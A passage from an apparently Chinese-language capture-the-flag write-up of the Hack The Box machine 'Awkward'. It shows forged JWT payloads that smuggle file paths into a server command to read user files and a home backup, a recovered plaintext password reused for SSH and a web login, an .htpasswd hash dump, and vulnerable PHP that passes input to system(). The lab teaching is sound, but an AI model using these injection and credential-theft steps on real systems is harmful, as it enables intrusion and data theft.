                                 Dload  Upload   Total   Spent    Left  Speed
100  3059  100  3059    0     0   3216      0 --:--:-- --:--:-- --:--:--  3213
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现2个用户，bean和christine</p>
<p>尝试修改payload如下，执行类似上述的命令</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/bean/.ssh/id_rsa '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>报错Failed to retrieve leave requests</p>
<p>修改payload如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/christine/.ssh/id_rsa '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>依然报错Failed to retrieve leave requests</p>
<p>修改如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/bean/.bashrc '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>有东西了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc3ODIwMDczfQ.NJ1ArXnFPdqvtf4K9Exdo34a4r73JZNUlg6VANAW7sQ"                    
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] &amp;&amp; eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] &amp;&amp; [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] &amp;&amp; echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大概在98行，看到有</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>尝试用JWT去读<code>/home/bean/Documents/backup_home.sh</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzc4MjAwNzN9.FeikFTrIWzIe5LAJnPRZGH_Z7B1RLpfKJ4saxf9T74s"
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date &gt; /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看到有<code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code></p>
<p>再用JWT去读，并且用curl把他输出到本地</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NzgyMDA3M30.wArGs4nDtEexKppqgQ1gHSOrq1y91D486JBYTpN4f7E" --output bean_backup_final.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 31716  100 31716    0     0  20265      0  0:00:01  0:00:01 --:--:-- 20265<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>unzip不行，直接双击打开，把文件拖出来，依次得到如下图文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303170423291.png"></p>
<p>解压bean_backup.tar.gz得到以下文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop/bean_backup]
└─# ls -la
total 72
drwxr-x--- 15 1001 1001 4096 Sep 15 07:45 .
drwxr-x---  3 1001 1001 4096 Mar  3 04:19 ..
lrwxrwxrwx  1 1001 1001    9 Sep 15 07:40 .bash_history -&gt; /dev/null
-rw-r--r--  1 1001 1001  220 Sep 15 07:34 .bash_logout
-rw-r--r--  1 1001 1001 3847 Sep 15 07:45 .bashrc
drwx------ 12 1001 1001 4096 Sep 15 07:41 .config
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Desktop
drwxr-xr-x  4 1001 1001 4096 Sep 15 07:46 Documents
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Downloads
drwx------  2 1001 1001 4096 Sep 15 07:36 .gnupg
drwx------  3 1001 1001 4096 Sep 15 07:35 .local
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Music
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Pictures
-rw-r--r--  1 1001 1001  807 Sep 15 07:34 .profile
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Public
drwx------  3 1001 1001 4096 Sep 15 07:35 snap
drwx------  2 1001 1001 4096 Sep 15 07:36 .ssh
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Templates
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Videos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>.config/xpad/content-DS1ZS1</code>文件里发现一对疑似用户名密码的东西，最后还有一句，<code>MAKE SURE TO USE THIS EVERYWHERE</code>，看来这个账户密码会不止一次用到，由此可见，若是在真实渗透，前期收集的资产可能后期还会用到，整理好资产！</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean.hill	#连接ssh时发现用户名是bean
014mrbeanrules!#P<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303172108467.png"></p>
<p>SSH连上去</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303172702700.png"></p>
<h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>查看host文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:~$ cat /etc/hosts
127.0.0.1       localhost hat-valley.htb store.hat-valley.htb
127.0.0.1       awkward

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现新子域名，添加进本地hosts文件，访问，发现要用户名密码</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">store.hat-valley.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>网站是nginx服务器，nginx服务器的默认用户名密码通常在<code>/etc/nginx/conf.d/.htaccess</code>，那么我们尝试访问，但访问不到，发现有<code>/etc/nginx/conf.d/.htpasswd</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303173843111.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>hash尝试各种爆破无果，想起之前的<code>MAKE SURE TO USE THIS EVERYWHERE</code>，尝试各种组合之后，发现用户名是admin，密码是bean用户的密码，成功登入</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303174518831.png"></p>
<p>经查找，站点源码在<code>/var/www/store</code>目录下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ ls -la
total 104
drwxr-xr-x 9 root root  4096 Oct  6 01:35 .
drwxr-xr-x 7 root root  4096 Oct  6 01:35 ..
drwxrwxrwx 2 root root  4096 Mar  3 21:30 cart
-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
drwxr-xr-x 2 root root  4096 Oct  6 01:35 css
drwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts
drwxr-xr-x 6 root root  4096 Oct  6 01:35 img
-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
drwxr-xr-x 3 root root  4096 Oct  6 01:35 js
drwxrwxrwx 2 root root  4096 Mar  3 21:50 product-details
-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
drwxr-xr-x 6 root root  4096 Oct  6 01:35 static
-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看<code>README.md</code></p>
<p>有几个信息</p>
<ol>
<li><p>没有数据库，只有离线文件</p>
</li>
<li><p><code>/product-details</code>存储产品信息</p>
</li>
<li><p><code>/cart</code>存储用户的购物车信息，并且根据用户的<code>session ID</code>命名</p>
</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ cat README.md                                       
# Hat Valley - Shop Online!                                                         
                                                                                     
### To Do                                                                             
1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
2. Implement checkout system, link with credit card system (Stripe??)                 
3. Implement shop filter                                                             
4. Get full catalogue of items                                                                           
### How to Add New Catalogue Item                                                     
1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
2. Change the fields to the appropriate values and save the file.  
-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --

### Hat Valley Cart
Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>查看<code>cart_actions.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$STORE_HOME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/store/"</span><span class="token punctuation">;</span>

<span class="token comment">//check for valid hat valley store item</span>
<span class="token keyword">function</span> <span class="token function-definition function">checkValidItem</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$first_line</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$first_line</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"***Hat Valley"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//add to cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'add_item'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$item_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$bad_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no hacking allowed!!</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$item_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>product-details/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo '***Hat Valley Cart***' &gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head -2 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>product-details/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>.txt | tail -1 &gt;&gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Item added successfully!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid item"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//delete from cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'delete_item'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$item_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$bad_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no hacking allowed!!</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$item_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sed -i '/item_id=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>/d' <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Item removed from cart"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid item"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//fetch from cart</span>
